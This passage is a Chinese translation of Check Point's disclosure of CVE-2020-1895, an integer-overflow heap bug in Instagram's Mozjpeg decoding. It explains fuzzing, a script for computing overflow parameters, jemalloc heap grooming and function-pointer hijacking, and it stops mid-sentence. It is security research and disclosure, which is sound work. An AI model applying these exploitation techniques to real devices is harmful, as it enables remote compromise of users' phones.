@@ -1,0 +1,1003 @@
+# 适用于Android和iOS的Instagram App中的远程代码执行漏洞
+
+阅读量 **320706**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2020-10-16 10:30:45
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 checkpoint，文章来源：research.checkpoint.com
+
+原文地址：<https://research.checkpoint.com/2020/instagram_rce-code-execution-vulnerability-in-instagram-app-for-android-and-ios/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t010082ad970d88d6f5.jpg)
+
+## 背景
+
+Instagram每天上传超过100+百万张照片，是最受欢迎的社交媒体平台之一。
+基于这个原因，我们决定测试适用于Android和iOS操作系统的Instagram应用的安全性。
+在其中我们发现了一个严重漏洞，可以用来在受害者的手机上远程执行任意代码。
+
+我们进行此研究的关注方向是测试Instagram使用的第三方项目组件。
+
+现如今，许多软件开发人员，无论其项目规模大小，都会在其软件中使用开源项目。在此次研究的最后，我们在Instagram使用的`Mozjpeg`（一个开源项目用作其JPEG格式解码器）库中发现了一个漏洞。
+
+在我们下面描述的攻击情形中，攻击者只需要通过电子邮件，或其他媒体交换平台将图像发送给受害者。 当受害者打开Instagram应用程序时，就会执行恶意代码。
+
+## 告诉我你的朋友是谁，我会告诉你他的漏洞
+
+我们都知道，即使是大公司大都也依赖于开源项目，并且这些项目几乎不经过修改就集成到了他们的产品中。
+
+大多数使用第三方开源项目的公司都对其进行了声明，但并非所有库都显示在该应用程序的“About”页中。
+为了确保能查看到所有的库最好的办法是查看Instagram应用的`lib-superpack-zstd`目录：
+
+![](https://p3.ssl.qhimg.com/t01224d4d5c723fde8f.png)
+
+在下图中，可以看到当使用Instagram上传图像时，将加载三个共享库：`libfb_mozjpeg.so`，`libjpegutils_moz.so`和`libcj_moz.so`。
+
+![](https://p0.ssl.qhimg.com/t01b809740ddd8d352f.png)
+
+`moz`后缀是`mozjpeg`的缩写，`mozjpeg`是Mozilla JPEG编码器项目的缩写，我们需要了解一些这些模块都做了什么？
+
+## Mozjpeg是什么？
+
+让我们从`JPEG`格式的简要历史开始。JPEG是一种自1990年代初期以来就存在的图像文件格式，它基于有损压缩的概念，这意味着在压缩过程中会丢失一些信息，但是人眼可以忽略不计。Libjpeg是Windows，Mac和Linux操作系统中内置的基准JPEG编码器，由一个非正式的独立小组维护。该库试图在编码速度和质量与文件大小之间取得平衡。
+
+相反，[Libjpeg-turbo](https://www.libjpeg-turbo.org/)是libjpeg的高性能替代品，并且是大多数Linux发行版的默认库。该库旨在在编码和解码期间使用较少的CPU时间。
+
+2014年3月5日，Mozilla发布了[Mozjpeg](https://github.com/mozilla/mozjpeg)项目，这是一个基于libjpeg-turbo之上的JPEG编码器，目的是为Web图像提供更好的压缩效果，但会降低性能。
+
+在Instagram的使用中将mozjpeg库拆分为3个不同的共享对象：
+
+  * libfb_mozjpeg.so –负责Mozilla特定的解压缩导出的API。
+  * libcj_moz.so –解析图像数据的libjeg-turbo。
+  * libjpegutils_moz.so –两个共享对象之间的连接器。它包含JNI调用以从Java应用程序端调用解压缩的API。
+
+## Fuzzing
+
+我们在CPR的团队建立了一个多处理器模糊测试实验室，通过我们以往的[Adobe
+Research](https://research.checkpoint.com/50-adobe-cves-in-50-days/)为我们带来了惊人的结果，因此我们决定将模糊测试工作也扩展到Mozjpeg。
+
+由于libjpeg-turbo已经被[fuzz测试多次](https://seclists.org/fulldisclosure/2013/Nov/83)，因此我们把精力集中专注于Mozjpeg。
+
+Mozilla在libjpeg-turbo之上所做的主要添加是压缩算法，因此这才是我们研究的重点。
+
+AFL是我们首选的武器，因此自然而然地我们必须为其编写harness。
+
+要编写harness，我们必须了解如何使用Mozjpeg解压功能。
+
+幸运的是，Mozjpeg附带了一个代码示例，说明了如何使用该库：
+
+    
+    
+    METHODDEF(int)
+    do_read_JPEG_file(struct jpeg_decompress_struct *cinfo, char *filename)
+    {
+      struct my_error_mgr jerr;
+      /* More stuff */
+      FILE *infile;                 /* source file */
+      JSAMPARRAY buffer;            /* Output row buffer */
+      int row_stride;               /* physical row width in output buffer */
+      if ((infile = fopen(filename, "rb")) == NULL) {
+        fprintf(stderr, "can't open %s\\n", filename);
+        return 0;
+      }
+    /* Step 1: allocate and initialize JPEG decompression object */
+      /* We set up the normal JPEG error routines, then override error_exit. */
+      cinfo->err = jpeg_std_error(&jerr.pub);
+      jerr.pub.error_exit = my_error_exit;
+      /* Establish the setjmp return context for my_error_exit to use. */
+      if (setjmp(jerr.setjmp_buffer)) {
+        jpeg_destroy_decompress(cinfo);
+        fclose(infile);
+        return 0;
+      }
+    /* Now we can initialize the JPEG decompression object. */
+      jpeg_create_decompress(cinfo);
+      /* Step 2: specify data source (eg, a file) */
+      jpeg_stdio_src(cinfo, infile);
+      /* Step 3: read file parameters with jpeg_read_header() */
+      (void)jpeg_read_header(cinfo, TRUE);
+      /* Step 4: set parameters for decompression */
+      /* In this example, we don't need to change any of the defaults set by
+       * jpeg_read_header(), so we do nothing here.
+       */
+      /* Step 5: Start decompressor */
+      (void)jpeg_start_decompress(cinfo);
+      /* JSAMPLEs per row in output buffer */
+      row_stride = cinfo->output_width * cinfo->output_components;
+      /* Make a one-row-high sample array that will go away when done with image */
+      buffer = (*cinfo->mem->alloc_sarray)
+                    ((j_common_ptr)cinfo, JPOOL_IMAGE, row_stride, 1);
+      /* Step 6: while (scan lines remain to be read) */
+      /*           jpeg_read_scanlines(...); */
+      while (cinfo->output_scanline < cinfo->output_height) {
+        (void)jpeg_read_scanlines(cinfo, buffer, 1);
+        /* Assume put_scanline_someplace wants a pointer and sample count. */
+        put_scanline_someplace(buffer[0], row_stride);
+      }
+      /* Step 7: Finish decompression */
+      (void)jpeg_finish_decompress(cinfo);
+      /* Step 8: Release JPEG decompression object */
+      jpeg_destroy_decompress(cinfo);
+      fclose(infile);
+      return 1;
+    }
+    
+
+但是，为确保我们在Mozjpeg中发现的任何崩溃都影响Instagram本身，我们需要了解Instagram是如何将Mozjpeg集成到其代码中的。
+
+幸运的是，下面你可以看到Instagram直接复制粘贴了该库的最佳实践：
+
+![](https://p1.ssl.qhimg.com/t01a2213a4d525ef629.png)
+
+如上所示，他们真正改变的唯一一件事就是将示例代码中的`put_scanline_someplace`函数替换为利用`memcpy`的`read_jpg_copy_loop`函数。
+
+我们的`harness`从AFL接收生成的图片文件，并将它们发送到封装的Mozjpeg解压函数。
+
+我们仅用30个核心的CPU跑了fuzzer一天，就收到了AFL通知我们的447次独特的崩溃。
+
+在对结果进行分类之后，我们发现了与解析JPEG图像`Size`有关的有趣崩溃。 崩溃是一个越界写，我们决定专注研究它。
+
+## CVE-2020-1895
+
+存在漏洞的函数是`read_jpg_copy_loop`，它在解压缩过程中产生了整数溢出。
+
+![](https://p1.ssl.qhimg.com/t01ca227f7c548adedf.png)
+
+漏洞的函数在解析JPEG图像文件时处理图像尺寸不恰当。下面是原始漏洞函数的伪代码：
+
+    
+    
+    width = rect->right - rect->bottom;
+    height = rect->top - rect->left;
+    allocated_address = __wrap_malloc(width*height*cinfo->output_components);// <---Integer overflow
+    bytes_copied = 0;
+     while ( 1 ){
+       output_scanline = cinfo->output_scanline;
+       if ( (unsigned int)output_scanline >= cinfo->output_height )
+          break;
+        //reads one line from the file into the cinfo buffer
+        jpeg_read_scanlines(cinfo, line_buffer, 1);
+        if ( output_scanline >= Rect->left && output_scanline < Rect->top )
+        {
+            memcpy(allocated_address + bytes_copied , line_buffer, width*output_component);// <--Oops
+            bytes_copied += width * output_component;
+        }
+     }
+    
+
+首先，让我们了解这段代码的作用。
+
+`_wrap_malloc`函数基于3个参数（即图像尺寸）来分配内存块。宽度和高度都是从文件中解析的16位整数（uint16_t）。
+
+`cinfo->output_component`告诉我们每个像素代表多少字节。
+
+此变量的变化范围在1(灰度)，3(RGB) 和 4(RGB + Alpha\CMYK\etc)之间不等。
+
+除了高度和宽度，`output_component`也完全由攻击者控制。它是从文件中解析的，并且未针对文件中可用的剩余数据进行验证。
+
+`__warp_malloc`期望其参数在32位寄存器中传递！这意味着，如果我们可以使分配大小超过（2 ^
+32）个字节，则将发生整数溢出，从而导致分配的大小比预期的小得多。
+
+分配的尺寸是通过将图片的宽度，高度和`output_components`相乘得出的。这些大小不受检查，由我们控制。滥用它们便会得到我们想要的整数溢出。
+
+    
+    
+    __wrap_malloc(width * height * cinfo->output_components);// <---- Integer overflow
+    
+
+更为方便我们的是，此缓冲区然后会传递给`memcpy`，从而导致基于堆的缓冲区溢出。
+
+在分配内存后，将调用`memcpy`函数，并将图像数据复制到分配的内存中。
+
+复制是逐行进行的。
+
+    
+    
+    memcpy(allocated_address + bytes_copied ,line_buffer, width*output_component);//<--Oops
+    
+
+图片大小（width*output_component）的数据被复制（height）次。
+
+从漏洞利用者的角度来看，这是一个很有希望的bug：线性堆溢出使攻击者可以控制分配的大小，溢出的大小以及溢出的内存区域的内容。
+
+## Wild Copy 利用
+
+为了导致内存损坏，需要溢出整数以确定分配大小； 因此计算的大小必须超过32位所能表示的最大值。
+此时我们就是正在处理一个`WildCopy`的漏洞利用，这意味着我们必须复制大于2^32（4GB）的数据。
+因此，当循环到达未映射的页面时，程序极有可能崩溃：
+
+![](https://p0.ssl.qhimg.com/t01a9d2f172d11ae99d.png)
+
+那么我们如何利用这一点呢？
+
+在深入研究`Wildcopy`利用技术之前，我们需要将我们的情况与经典的`wildcopy`(如[Stagefright
+bug](https://googleprojectzero.blogspot.com/2015/09/stagefrightened.html))区分开来。
+经典案例通常涉及一个写入4GB数据的`memcpy`。
+
+但是，在我们的示例中，有一个for循环尝试将X字节复制Y次，而`X * Y`为4GB。
+
+当我们尝试利用这种内存损坏漏洞时，我们需要问自己几个重要的问题：
+
+>   * 我们能否控制（甚至部分控制）我们破坏的数据的内容？
+>   * 我们可以控制要破坏的数据的长度吗？
+>   * 我们可以控制溢出的已分配块的大小吗？
+>
+
+最后一个问题尤其重要，因为在`Jemalloc/LFH`（或每个基于bucket的分配器）中，如果我们无法控制要破坏的块的大小，则可能难以对堆进行布局以进一步破坏一个特定目标结构（如果该结构的大小明显不同）。
+
+一眼望去，关于我们控制内容的能力的第一个问题的答案似乎是“是”，因为我们可以控制图像数据的内容。
+
+现在，转到第二个问题–控制我们破坏数据的长度。
+答案也显然是“是”，因为`memcpy`循环逐行复制文件，并且复制的每一行的大小都是由攻击者控制的`width`参数和`output_component`的乘积。
+
+关于我们破坏的缓冲区大小的第三个问题的答案是微不足道的。
+
+由于它是由`width * height * cinfo->
+output_components`控制的，因此我们编写了一个小Python脚本，该脚本根据整数溢出的影响，根据希望分配的块大小，为我们提供了这三个参数的含义：
+
+    
+    
+    import sys
+    def main(low=None, high=None):
+        res = []
+        print("brute forcing...")
+        for a in range(0xffff):
+            for b in range(0xffff):
+                 x = 4 * (a+1) * (b+1) - 2**32
+                 if 0 < x <= 0x100000:#our limit
+                     if (not low or (x > low)) and (not high or x <= high):
+                            res.append((x, a+1, b+1)) 
+        for s, x, y in sorted(res, key=lambda i: i[0]):
+             print "0x%06x, 0x%08x, 0x%08x" % (s, x, y)
+    if __name__ == '__main__':
+        high = None
+        low = None 
+        if len(sys.argv) == 2:
+            high = int(sys.argv[1], 16)
+        elif len(sys.argv) == 3:
+             high = int(sys.argv[2], 16)
+             low = int(sys.argv[1], 16) 
+        main(low, high)
+    
+
+现在，我们已经具备了使用`wildcopy`的先决条件，让我们看看如何利用它们。
+
+要触发此漏洞，我们必须指定一个大于`2 ^ 32`字节的数据长度。实际上，我们需要在到达未映射的内存之前停止`wildcopy`。
+
+我们有很多选择：
+
+>   *
+> 依靠竞态条件–尽管wildcopy破坏了一些有用的目标结构或内存，但是我们可以竞争另一个线程，以在wildcopy崩溃之前使用现在已损坏的数据来执行某些操作（例如，构造其他原语，终止wildcopy等）。
+>   * 如果wildcopy循环具有某种逻辑，可以在某些情况下停止循环，那么我们可以打乱这些检查，并在破坏足够的数据后停止循环。
+>   *
+> 如果wildcopy循环在每次迭代时都调用一个虚函数，并且指向该函数的指针位于堆内存中的结构中（或位于我们在wildcopy期间可能损坏的另一个内存地址中），则漏洞利用程序可以使用该循环来覆盖并在wildcopy期间转移执行。
+>
+
+遗憾的是，第一种方法不适用于此处，因为我们是从图像向量中进行攻击。 因此，我们对线程没有任何控制，因此竞态条件选项无济于事。
+
+为了使用第二种方法，我们寻找了一个终止开关来停止wildcopy。 我们尝试将文件切成两半，同时保持图像标题中的大小相同。
+但是，我们发现，如果解码库达到一个EOF标记，它只会添加另一个EOF标记，因此我们最终陷入EOF标记的无限循环中。
+
+我们还尝试寻找一种`ERREXIT`函数，该函数可以在运行时停止解压缩过程，但是我们了解到，无论我们做什么，我们都永远无法在此代码中找到导致`ERREXIT`的路径。
+因此，第二种选择也不适用。
+
+要使用第三个选项，我们需要寻找一个在wildcopy循环的每次迭代中都会调用的虚函数。
+
+让我们回到发生memcpy复制的循环逻辑：
+
+    
+    
+    while ( 1 ){
+       output_scanline = cinfo->output_scanline;
+       if ( (unsigned int)output_scanline >= cinfo->output_height )
+          break;
+        jpeg_read_scanlines(cinfo, line_buffer, 1);
+        if ( output_scanline >= Rect->left && output_scanline < Rect->top )
+        {
+            memcpy(allocated_address + bytes_copied , line_buffer, width*output_component)
+            bytes_copied += width * output_component;
+        }
+     }
+    
+
+我们可以看到，除了覆盖我们的`memcpy…` 之外，只有一个函数可以在每次迭代中调用—`jpeg_read_scanlines`
+
+让我们检查一下`jpeg_read_scanlines`的代码：
+
+    
+    
+    GLOBAL(JDIMENSION)
+    jpeg_read_scanlines(j_decompress_ptr cinfo, JSAMPARRAY scanlines,
+                        JDIMENSION max_lines)
+    {
+      JDIMENSION row_ctr;
+      if (cinfo->global_state != DSTATE_SCANNING)
+        ERREXIT1(cinfo, JERR_BAD_STATE, cinfo->global_state);
+      if (cinfo->output_scanline >= cinfo->output_height) {
+        WARNMS(cinfo, JWRN_TOO_MUCH_DATA);
+        return 0;
+      }
+      /* Call progress monitor hook if present */
+      if (cinfo->progress != NULL) {
+        cinfo->progress->pass_counter = (long)cinfo->output_scanline;
+        cinfo->progress->pass_limit = (long)cinfo->output_height;
+        (*cinfo->progress->progress_monitor) ((j_common_ptr)cinfo);
+      }
+      /* Process some data */
+      row_ctr = 0;
+      (*cinfo->main->process_data) (cinfo, scanlines, &row_ctr, max_lines);
+      cinfo->output_scanline += row_ctr;
+      return row_ctr;
+    }
+    
+
+在上面的代码中我们可以看到，每次调用`jpeg_read_scanlines`从文件中读取另一行时，我们都会调用虚拟函数`process_data`。
+
+从文件中读取的行被复制到`cinfo`结构内的`row_ctr`的缓冲区中。
+
+    
+    
+    (*cinfo->main->process_data) (cinfo, scanlines, &row_ctr, max_lines);
+    
+
+`proccess_data`指向另一个名为`process_data_simple_main`的函数：
+
+    
+    
+    process_data_simple_main(j_decompress_ptr cinfo, JSAMPARRAY output_buf,
+                             JDIMENSION *out_row_ctr, JDIMENSION out_rows_avail)
+    {
+      my_main_ptr main_ptr = (my_main_ptr)cinfo->main;
+      JDIMENSION rowgroups_avail;
+      /* Read input data if we haven't filled the main buffer yet */
+      if (!main_ptr->buffer_full) {
+        if (!(*cinfo->coef->decompress_data) (cinfo, main_ptr->buffer))
+          return;                   
+        main_ptr->buffer_full = TRUE;      
+      }
+      rowgroups_avail = (JDIMENSION)cinfo->_min_DCT_scaled_size;
+      /* Feed the postprocessor */
+      (*cinfo->post->post_process_data) (cinfo, main_ptr->buffer,
+                                         &main_ptr->rowgroup_ctr, rowgroups_avail,
+                                         output_buf, out_row_ctr, out_rows_avail);
+    
+      /* Has postprocessor consumed all the data yet? If so, mark buffer empty */
+      if (main_ptr->rowgroup_ctr >= rowgroups_avail) {
+        main_ptr->buffer_full = FALSE;
+        main_ptr->rowgroup_ctr = 0;
+      }
+    }
+    
+
+从`process_data_simple_main`中，我们可以确定另外2个在每次迭代中都会调用的虚函数。 它们都有一个cinfo结构。
+
+什么是`cinfo`呢？
+
+`Cinfo`是在Mozjpeg各种函数期间传递的结构。 它包含关键成员，函数指针和图像元数据。
+
+让我们看看来自`Jpeglib.h`的`cinfo`结构
+
+    
+    
+    struct jpeg_decompress_struct { 
+            struct jpeg_error_mgr *err;   
+            struct jpeg_memory_mgr *mem;  
+            struct jpeg_progress_mgr *progress; 
+            void *client_data;            
+            boolean is_decompressor;     
+            int global_state 
+                struct jpeg_source_mgr *src;
+                JDIMENSION image_width;
+                JDIMENSION image_height;
+                int num_components;
+                ...
+           J_COLOR_SPACE out_color_space;
+           unsigned int scale_num
+           ...
+           JDIMENSION output_width;      
+           JDIMENSION output_height;     
+           int out_color_components;     
+           int output_components;        
+           int rec_outbuf_height;
+           int actual_number_of_colors;  
+           ...
+           boolean saw_JFIF_marker;      
+           UINT8 JFIF_major_version;    
+           UINT8 JFIF_minor_version;
+           UINT8 density_unit;           
+           UINT16 X_density;             
+           UINT16 Y_density;             
+           ...    
+           ...
+           int unread_marker;
+           struct jpeg_decomp_master *master;    
+           struct jpeg_d_main_controller *main;  <<-- there’s a function pointer here
+           struct jpeg_d_coef_controller *coef; <<-- there’s a function pointer here
+           struct jpeg_d_post_controller *post; <<-- there’s a function pointer here
+           struct jpeg_input_controller *inputctl; 
+           struct jpeg_marker_reader *marker;
+           struct jpeg_entropy_decoder *entropy;
+           . . .
+           struct jpeg_upsampler *upsample;
+           struct jpeg_color_deconverter *cconvert
+            . . .
+    };
+    
+
+在`cinfo`结构中，我们可以看到3个指向函数的指针，这些指针可以在循环覆盖期间尝试覆盖并劫持执行流。
+
+事实证明，上面提到的第三个方案适用于我们的情况！
+
+## Jemalloc 101
+
+在深入探讨`Jemalloc`利用概念之前，我们需要了解Android的堆分配器的工作方式，以及我们将在下一章着重介绍的所有术语-Chunks, Runs,
+Regions。
+
+Jemalloc是一个基于bucket的分配器，它将内存分成大小始终相同的块(Chunks)，并使用这些块(Chunks)存储所有数据结构（以及用户请求的内存）。
+块被进一步划分为“runs”，它负责特定大小的请求/分配。 run会跟踪这些大小块的free操作和使用过的“Regions(区域)”。
+Regions是在用户空间分配（malloc调用）上返回的堆块。
+最后，每次运行都与一个“bin”相关联。`Bins`负责存储free区域(Regions)的结构（树）。
+
+![](https://p1.ssl.qhimg.com/t01e08e4856f9bc651f.png)
+
+## 控制PC寄存器
+
+我们发现了3个好的函数指针，可用于在wildcopy期间转移执行并控制PC寄存器。
+
+`cinfo`结构具有以下成员：
+
+>   * _struct jpeg_d_post_controller \_ post*
+>   * _struct jpeg_d_main_controller \_ main*
+>   * struct jpeg_d_coef_controller *coef
+>
+
+这3个结构在`Jpegint.h`中定义如下:
+
+    
+    
+    /* Main buffer control (downsampled-data buffer) */
+    struct jpeg_d_main_controller {
+      void (*start_pass) (j_decompress_ptr cinfo, J_BUF_MODE pass_mode);
+      void (*process_data) (j_decompress_ptr cinfo, JSAMPARRAY output_buf,
+                            JDIMENSION *out_row_ctr, JDIMENSION out_rows_avail);
+    };
+    
+    /* Coefficient buffer control */
+    struct jpeg_d_coef_controller {
+      void (*start_input_pass) (j_decompress_ptr cinfo);
+      int (*consume_data) (j_decompress_ptr cinfo);
+      void (*start_output_pass) (j_decompress_ptr cinfo);
+      int (*decompress_data) (j_decompress_ptr cinfo, JSAMPIMAGE output_buf);
+      jvirt_barray_ptr *coef_arrays;
+    };
+    
+    /* Decompression postprocessing (color quantization buffer control) */
+    struct jpeg_d_post_controller {
+      void (*start_pass) (j_decompress_ptr cinfo, J_BUF_MODE pass_mode);
+      void (*post_process_data) (j_decompress_ptr cinfo, JSAMPIMAGE input_buf,
+                                 JDIMENSION *in_row_group_ctr,
+                                 JDIMENSION in_row_groups_avail,
+                                 JSAMPARRAY output_buf, JDIMENSION *out_row_ctr,
+                                 JDIMENSION out_rows_avail);
+    
+
+我们需要找到3种结构在堆存储器中的位置，基于此我们可以覆盖其中至少一种结构以获得对PC寄存器的控制。
+
+为了弄清楚这一点，我们需要了解使用Mozjpeg解压缩图像时堆的样子。
+
+## Mozjpeg内的内存管理器
+
+让我们回想一下`cinfo`最重要的struct成员之一：
+
+    
+    
+    struct jpeg_memory_mgr *mem;  /* Memory manager module */
+    
+
+Mozjpeg有自己的内存管理器。JPEG库的内存管理器控制内存的分配和释放，并管理大型“虚拟”数据数组。
+库中的所有内存和临时文件分配都是通过内存管理器完成的。 这种方法有助于防止内存泄漏问题，并且在malloc/free运行缓慢时加速操作。
+
+内存管理器创建被释放内存的“内存池”，并且可以一次释放整个池。
+
+一些数据是被“永久”分配使用的，直到销毁JPEG对象后才会释放。
+
+大多数数据是根据图像大小来分配的，并由`jpeg_finish_decompress`或`jpeg_abort`函数释放。
+
+例如，让我们看一下Mozjpeg在图像解码过程中所做的一种堆的分配。
+当Mozjpeg要求分配0x108字节时，堆分配器实际上会给一个大小为0x777的堆块。 我们看到，请求的大小和分配的实际大小不同。
+
+我们需要来分析一下这种行为。
+
+Mozjpeg使用封装的两个函数`alloc_small`和`alloc_large`来分配较小和较大的内存块。
+
+    
+    
+    METHODDEF(void *)
+    alloc_small(j_common_ptr cinfo, int pool_id, size_t sizeofobject){
+    ...
+    ...
+    hdr_ptr = (small_pool_ptr)jpeg_get_small(cinfo, min_request + slop);
+    slop = first_pool_slop[1] == 16000
+    min_request = sizeof(small_pool_hdr) + sizeofobject + ALIGN_SIZE - 1;
+    
+    sizeofobject == round_up_pow2(0x120, ALIGN_SIZE) == 0x120
+    ALIGN_SIZE   == 16
+    sizeof(small_pool_hdr) = 0x20
+    static const size_t first_pool_slop[JPOOL_NUMPOOLS] = {
+                        1600,                    /* first PERMANENT pool */
+                        16000                    /* first IMAGE pool */
+                                                          };
+    
+
+调用`jpeg_get_small`时，基本上是在调用`malloc`。
+
+    
+    
+    GLOBAL(void *)
+    jpeg_get_small(j_common_ptr cinfo, size_t sizeofobject)
+    {
+      return (void *)malloc(sizeofobject);
+    }
+    
+
+分配的“池”由`alloc_small`和其他封装的函数管理，这些函数维护一组成员，以帮助它们监视“池”的状态。
+因此，每当请求内存分配时，封装的函数都会检查“池”中是否有足够的空间。
+
+如果有可用空间，则`alloc_small`函数从当前“池”中返回一个地址，并使指向池中空闲块的指针移动。
+
+当“池”空间不足时，它将使用从`first_pool_slop`数组中读取的预定义的内存块分配另一个“池”，在我们的示例中为`1600`和`16000`。
+
+    
+    
+    static const size_t first_pool_slop[JPOOL_NUMPOOLS] = {
+                        1600,                    /* first PERMANENT pool */
+                        16000                    /* first IMAGE pool */
+                                                          };
+    
+
+现在，我们了解了Mozjpeg的内存管理器是如何工作的，我们需要确定哪个内存“池”保存着目标虚拟函数指针。
+
+作为解压缩过程的一部分，有两个主要函数可对图像元数据进行解码并为以后的处理做好准备。直到我们到达wildcopy循环为止，仅有`jpeg_read_header`和`jpeg_start_decompress`两个函数负责内存分配。
+
+`jpeg_read_header`解析文件中的不同标记。
+
+在解析这些标记时，第二个也是最大的“池”，大小为`16000(0x3e80)`，由Mozjpeg内存管理器分配。“池”的大小是`first_pool_slop`数组（来自上面的代码段）中的const值，这意味着Mozjpeg的内部分配器已经使用了第一个池的所有空间。
+
+我们知道，我们的目标main，coef和post结构是从`jpeg_start_decompress`函数中分配的。因此，我们可以放心地假设其他分配的结构（直到我们到达wildcopy循环）也将位于第二个大“池”中，包括我们要覆盖的main，coef和post结构！
+
+现在，让我们仔细看看Jemalloc如何处理这种大小类分配。
+
+## 使用shadow照亮堆
+
+Jemalloc返回的内存大小分为三类-小，大，巨大。
+
+>   * 小型/中型：这些区域小于内存页大小（通常为4KB）。
+>   * 大：这些区域介于小/中和大之间（内存页大小与块(chunk)大小之间）。
+>   * 巨大：大于块(chunk)的大小。它们被单独处理与arenas无关，有一个全局分配器树。
+>
+
+操作系统返回的内存分为多个部分。在Android中，对应于不同的版本，这些块的大小也不相同。它们通常约为2MB/4MB。每个块都与一个arena关联。
+
+run可用于托管一个分配的大块或分配的多个小块。
+
+大型regions有自己的runs，即每个分配的大块都有专用的run。
+
+我们知道我们的目标“池”大小为(0x3e80 = 16,000 DEC)，大于内存页大小(4K)，小于Android
+chunk大小。因此，Jemalloc每次都会分配一个大的run(0x5000)！
+
+让我们仔细看看。
+
+    
+    
+    (gdb)info registers X0
+    X0        0x3fc7
+    (gdb)bt
+    #0  0x0000007e6a0cbd44 in malloc () from target:/system/lib64/libc.so
+    #1  0x0000007e488b3e3c in alloc_small () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    #2  0x0000007e488ab1e8 in get_sof () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    #3  0x0000007e488aa9b8 in read_markers () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    #4  0x0000007e488a92bc in consume_markers () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    #5  0x0000007e488a354c in jpeg_consume_input () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    #6  0x0000007e488a349c in jpeg_read_header () from target:/data/data/com.instagram.android/lib-superpack-zstd/libfb_mozjpeg.so
+    
+
+我们可以看到传给malloc的实际参数值确实是（0x3fc7）。
+这与16000（0x3e80）的内存size加上Mozjpeg的`large_pool_hdr`的size，以及应该分配的对象的实际size和`ALIGN_SIZE(16/32)
+– 1`的值相匹配。
+
+在为漏洞利用实现堆布局时，有一种可视化堆的方法：查看堆上下文中的各种内存分配。
+
+为此，我们使用一个简单的工具，使我们可以在漏洞利用开发过程中检查目标进程的堆状态。
+我们使用了`argp`和`vats`编写的名为[shadow](https://github.com/CENSUS/shadow)的工具来可视化Jemalloc堆。
+
+我们使用gdb上的shadow执行了调试会话，以验证我们的假设。
+
+    
+    
+    Cinfo:
+    (gdb) x/164xw 0x729f4f8b98
+    0x729f4f8b98:    0x9f4f89f0    0x00000072    0xbdfe3040    0x00000072
+    0x729f4f8ba8:    0x00000000    0x00000000    0x00000014    0x000002a8
+    0x729f4f8bb8:    0x00000001    0x000000cd    0xbdef79f0    0x00000072
+    0x729f4f8bc8:    0x00006a44    0x00009a2e    0x00000003    0x00000003
+    0x729f4f8bd8:    0x0000000c    0x00000001    0x00000001    0x00000000
+    0x729f4f8be8:    0x00000000    0x3ff00000    0x00000000    0x00000000
+    0x729f4f8bf8:    0x00000000    0x00000001    0x00000001    0x00000000
+    0x729f4f8c08:    0x00000002    0x00000001    0x00000100    0x00000000
+    0x729f4f8c18:    0x00000000    0x00000000    0x00006a44    0x00009a2e
+    0x729f4f8c28:    0x00000004    0x00000004    0x00000001    0x00000000
+    0x729f4f8c38:    0x00000000    0x00000000    0x00000000    0x00000001
+    0x729f4f8c48:    0x00000000    0x00000001    0x00000000    0x00000000
+    0x729f4f8c58:    0x00000000    0x00000000    0xbdef7a40    0x00000072
+    0x729f4f8c68:    0xbdef7ad0    0x00000072    0x00000000    0x00000000
+    0x729f4f8c78:    0x00000000    0x00000000    0xbdef7b60    0x00000072
+    0x729f4f8c88:    0xbdef7da0    0x00000072    0x00000000    0x00000000
+    0x729f4f8c98:    0x00000000    0x00000000    0xbdef7c80    0x00000072
+    0x729f4f8ca8:    0x9f111ca0    0x00000072    0x00000000    0x00000000
+    0x729f4f8cb8:    0x00000000    0x00000000    0x00000008    0x00000000
+    0x729f4f8cc8:    0xa63e9be0    0x00000072    0x00000000    0x00000000
+    0x729f4f8cd8:    0x00000000    0x00000000    0x00000000    0x00000000
+    0x729f4f8ce8:    0x00000000    0x01010101    0x01010101    0x01010101
+    0x729f4f8cf8:    0x01010101    0x05050505    0x05050505    0x05050505
+    0x729f4f8d08:    0x05050505    0x00000000    0x00000000    0x00000101
+    0x729f4f8d18:    0x00010001    0x00000000    0x00000000    0x00000000
+    0x729f4f8d28:    0x00000000    0x00000000    0x00000002    0x00000002
+    0x729f4f8d38:    0x00000008    0x00000008    0x000009a3    0x00000000
+    0x729f4f8d48:    0xa63e9e00    0x00000072    0x00000003    0x00000000
+    0x729f4f8d58:    0xa63e9be0    0x00000072    0xa63e9c40    0x00000072
+    0x729f4f8d68:    0xa63e9ca0    0x00000072    0x00000000    0x00000000
+    0x729f4f8d78:    0x000006a5    0x000009a3    0x00000006    0x00000000
+    0x729f4f8d88:    0x00000000    0x00000000    0x00000000    0x00000001
+    0x729f4f8d98:    0x00000002    0x00000000    0x00000000    0x00000000
+    0x729f4f8da8:    0x00000000    0x00000000    0x0000003f    0x00000000
+    0x729f4f8db8:    0x00000000    0x00000008    0xa285d500    0x00000072
+    0x729f4f8dc8:    0x0000003f    0x00000000    0xbdef7960    0x00000072
+    0x729f4f8dd8:    0xa63eaa70    0x00000072  <========= main
+                                0xa63ea900    0x00000072  <========= post
+    0x729f4f8de8:    0xa63ea3e0    0x00000072  <========= coef
+        0xbdef7930    0x00000072
+    0x729f4f8df8:    0xbdef7820    0x00000072    0xa63ea790    0x00000072
+    0x729f4f8e08:    0xa63ea410    0x00000072    0xa63ea2c0    0x00000072
+    0x729f4f8e18:    0xa63ea280    0x00000072    0x00000000    0x00000000
+    
+    (gdb) jeinfo 0x72a63eaa70  <========= main
+    parent    address         size    
+    --------------------------------------    arena     0x72c808fc00    -       
+    chunk     0x72a6200000    0x200000
+    run       0x72a63e9000    0x5000  <========= our large targeted run!
+    
+
+## 堆布局策略
+
+我们的目标是利用整数溢出来导致堆缓冲区溢出。
+
+利用这些类型的bug都是对于堆对象的精确定位。我们想强制某些对象被分配在堆中的特定位置，因此我们可以布局形成有用的邻接关系来破坏内存。
+
+为了实现这种邻接，我们需要调整堆的布局，以便将可利用的内存对象分配在目标对象之前。
+
+不幸的是，我们无法控制free操作。根据Mozjpeg文档，大多数数据是按“per
